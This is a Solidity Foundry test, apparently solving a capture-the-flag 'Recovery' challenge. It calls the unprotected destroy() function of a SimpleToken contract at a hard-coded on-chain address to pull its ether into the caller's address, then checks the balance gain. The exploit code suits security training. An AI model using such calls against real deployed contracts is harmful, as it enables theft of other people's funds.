// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Recovery.sol";

contract RecoveryTest is Test {
  SimpleToken public exploitInstance;
  address private deployerAddress;
  uint256 public constant DEPOSIT_VALUE = 1_000_000_000_000_000;

  function setUp() public {
    // get the instance address from the onchain logs
    exploitInstance = SimpleToken(
      payable(0x2360ffFEC1c80cA71B51E905870D7A1433746DD0)
    );

    deployerAddress = vm.envAddress("DEPLOYER_ADDRESS");
  }

  function testFundsRecovery() public {
    uint256 balanceBefore = address(deployerAddress).balance;

    exploitInstance.destroy(payable(deployerAddress));

    uint256 balanceAfter = address(deployerAddress).balance;

    assertEq(balanceBefore + DEPOSIT_VALUE, balanceAfter);
  }
}
